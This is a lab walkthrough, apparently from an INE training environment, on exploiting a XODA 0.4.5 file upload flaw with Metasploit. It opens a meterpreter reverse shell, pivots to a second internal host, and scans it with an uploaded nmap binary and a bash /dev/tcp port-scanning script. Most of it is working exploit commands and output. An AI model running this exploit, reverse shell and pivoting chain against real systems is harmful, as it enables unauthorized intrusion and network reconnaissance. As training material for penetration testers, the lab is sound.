# T1046 : Network Service Scanning

### Information
**Start point:** `demo1.ine.local`
**No. of machines running:** 2
**Vulnerability:** XODA File Upload Vulnerability
**Metasploit module:** exploit/unix/webapp/xoda_file_upload

## Objective:
- Identify the number of ports running on the second target machine.
- Create a bash script to scan the ports of the second target machine
- Upload the nmap static binary to the target machine and identify the services running on the second target machine.


---
## Identify the number of ports running on the second target machine
We start the `postgresql` service and load up `msfconsole`. Then we set up a workspace for us to work in.
```bash
┌──(root㉿INE)-[~]
└─# service postgresql start
Starting PostgreSQL 16 database server: main.

┌──(root㉿INE)-[~]
└─# msfconsole
Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it 
with setg RHOSTS x.x.x.x
                                                  
                                              `:oDFo:`                            
                                           ./ymM0dayMmy/.                          
                                        -+dHJ5aGFyZGVyIQ==+-  
```
```bash

Metasploit Documentation: https://docs.metasploit.com/

msf6 > workspace -a my_lab
[*] Added workspace: my_lab
[*] Workspace: my_lab
msf6 > workspace
  default
* my_lab
msf6 > 
```
Now we run nmap to scan for ports present on the target.
```bash
msf6 > db_nmap -Pn -sV demo1.ine.local
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-08 17:18 IST
[*] Nmap: Nmap scan report for demo1.ine.local (192.241.27.3)
[*] Nmap: Host is up (0.000025s latency).
[*] Nmap: Not shown: 999 closed tcp ports (reset)
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
[*] Nmap: MAC Address: 02:42:C0:F1:1B:03 (Unknown)
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 6.40 seconds
msf6 > hosts

Hosts
=====

address       mac                name             os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----             -------  ---------  -----  -------  ----  --------
192.241.27.3  02:42:c0:f1:1b:03  demo1.ine.local  Linux                      server

msf6 > services
Services
========

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
192.241.27.3  80    tcp    http  open   Apache httpd 2.4.7 (Ubuntu)

msf6 > 
```
We can even try to `curl` into the website itself to see what it contains.
```bash
msf6 > curl demo1.ine.local
[*] exec: curl demo1.ine.local

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
        <title>XODA</title>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
                        <script language="JavaScript" type="text/javascript">
                        //<![CDATA[
                        var countselected=0;
                        function stab(id){var _10=new Array();for(i=0;i<_10.length;i++){document.getElementById(_10[i]).className="tab";}document.getElementById(id).className="stab";}var allfiles=new Array('');
                        //]]>
                </script>
                <script language="JavaScript" type="text/javascript" src="/js/xoda.js"></script>
                <script language="JavaScript" type="text/javascript" src="/js/sorttable.js"></script>
                <link rel="stylesheet" href="/style.css" type="text/css" />
</head>

<body onload="document.lform.username.focus();">
        <div id="top">
                <a href="/" title="XODA"><span style="color: #56a;">XO</span><span style="color: #fa5;">D</span><span style="color: #56a;">A</span></a>
                        </div>
        <form method="post" action="/?log_in" name="lform" id="login">
                <p>Username:&nbsp;<input type="text" id="un" name="username" /></p>
                <p>Password:&nbsp;<input type="password" name="password" /></p>
                <p><input type="submit" name="submit" value="login" /></p>
        </form>
</body>
</html>
        msf6 > 
```
We are gonna then look up any exploits for **xoda** (or just directly use the exploit mentioned) and then select it.
```bash
msf6 > search xoda

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/webapp/xoda_file_upload  2012-08-21       excellent  Yes    XODA 0.4.5 Arbitrary PHP File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/xoda_file_upload

msf6 > use exploit/unix/webapp/xoda_file_upload 
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/xoda_file_upload) > 
```
We check for the options needed for the exploit to function.
```bash
msf6 exploit(unix/webapp/xoda_file_upload) > show options

Module options (exploit/unix/webapp/xoda_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /xoda/           yes       The base path to the web application
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   XODA 0.4.5



View the full module info with the info, or info -d command.
```
We set the **RHOSTS** and the **TARGETURI** and then run it.
```bash
msf6 exploit(unix/webapp/xoda_file_upload) > set RHOSTS 192.241.27.3
RHOSTS => 192.241.27.3
msf6 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
TARGETURI => /   
msf6 exploit(unix/webapp/xoda_file_upload) > set LHOST 192.241.27.2
LHOST => 192.241.27.2
msf6 exploit(unix/webapp/xoda_file_upload) > run

[*] Started reverse TCP handler on 192.241.27.2:4444 
[*] Sending PHP payload (DrmAHQWdIs.php)
[*] Executing PHP payload (DrmAHQWdIs.php)
[*] Sending stage (39927 bytes) to 192.241.27.3
[!] Deleting DrmAHQWdIs.php
[*] Meterpreter session 1 opened (192.241.27.2:4444 -> 192.241.27.3:56342) at 2025-08-08 17:33:40 +0530

meterpreter > 
```
Now that we have access to the meterpreter, we spawn a **bash** shell.
```bash
meterpreter > shell
Process 801 created.
Channel 0 created.
/bin/bash -i
bash: cannot set terminal process group (433): Inappropriate ioctl for device
bash: no job control in this shell
www-data@demo1:/app/files$ 
```
Next we try to find the ip of the other system connected to this system.
```bash
www-data@demo1:/app/files$ ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:c0:f1:1b:03  
          inet addr:192.241.27.3  Bcast:192.241.27.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1165 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1119 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:169459 (169.4 KB)  TX bytes:79458 (79.4 KB)

eth1      Link encap:Ethernet  HWaddr 02:42:c0:5a:6a:02  
          inet addr:192.90.106.2  Bcast:192.90.106.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:19 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1602 (1.6 KB)  TX bytes:0 (0.0 B)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:6 errors:0 dropped:0 overruns:0 frame:0
          TX packets:6 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:300 (300.0 B)  TX bytes:300 (300.0 B)

www-data@demo1:/app/files$ 
```
We can see that the IP on `eth0` is the IP we used to connect to the machine and the ip on `eth1` is `192.90.106.2` so the ip of the second target machine should be `192.90.106.3`. Let's background our current session and run an auxiliary scanner to find the number of ports on the second machine.
```bash
msf6 exploit(unix/webapp/xoda_file_upload) > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce              .                normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan          .                normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner      .                normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                   .                normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                    .                normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                    .                normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                    .                normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access  .                normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access

msf6 exploit(unix/webapp/xoda_file_upload) > use auxiliary/scanner/portscan/tcp 
msf6 auxiliary(scanner/portscan/tcp) > 
```
We also set the proper options and run the module.
```bash
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.90.106.3
RHOSTS => 192.90.106.3
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000
PORTS => 1-1000
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.90.106.3:         - 192.90.106.3:22 - TCP OPEN
[+] 192.90.106.3:         - 192.90.106.3:21 - TCP OPEN
[+] 192.90.106.3:         - 192.90.106.3:80 - TCP OPEN
[*] 192.90.106.3:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
We see that there are three open ports on the machine. Next we create a simple TCP port scanning script in bash.
```bash
#!/bin/bash

# Usage: ./scanner.sh <target_ip> <start_port> <end_port>

target=$1
start_port=$2
end_port=$3

echo "Scanning $target from port $start_port to $end_port..."

for ((port=start_port; port<=end_port; port++)); do
  timeout 1 bash -c "echo > /dev/tcp/$target/$port" 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "Port $port is OPEN"
  fi
done
```
Now we just go back to **meterpreter** session and upload the bash script and the static binary for `nmap`. Next we spawn a shell, give the scripts execute permissions and then run them.
```bash
meterpreter > upload /root/p_scan.sh /tmp/p_scan.sh
[*] Uploading  : /root/p_scan.sh -> /tmp/p_scan.sh
[*] Uploaded -1.00 B of 353.00 B (-0.28%): /root/p_scan.sh -> /tmp/p_scan.sh
[*] Completed  : /root/p_scan.sh -> /tmp/p_scan.sh
meterpreter > upload /root/static-binaries/nmap /tmp/nmap
[*] Uploading  : /root/static-binaries/nmap -> /tmp/nmap
[*] Uploaded -1.00 B of 5.82 MiB (0.0%): /root/static-binaries/nmap -> /tmp/nmap
[*] Completed  : /root/static-binaries/nmap -> /tmp/nmap
meterpreter > shell
Process 813 created.
Channel 6 created.
bash
/bin/bash -i
bash: cannot set terminal process group (433): Inappropriate ioctl for device
bash: no job control in this shell
www-data@demo1:/app/files$ chmod +x /tmp/nmap
chmod +x /tmp/nmap
www-data@demo1:/app/files$ cd /tmp 
cd /tmp
www-data@demo1:/tmp$ chmod +x p_scan.sh
chmod +x p_scan.sh
www-data@demo1:/tmp$ ./nmap -p- 192.90.106.3
./nmap -p- 192.90.106.3
Starting Nmap 7.70 ( https://nmap.org ) at 2025-08-08 12:45 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.90.106.3
Host is up (0.00025s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds
www-data@demo1:/tmp$ ./p_scan.sh 192.90.106.3 1 1000
./p_scan.sh 192.90.106.3 1 1000
Scanning 192.90.106.3 from port 1 to 1000...
Port 21 is OPEN
Port 22 is OPEN
Port 80 is OPEN
www-data@demo1:/tmp$ 
```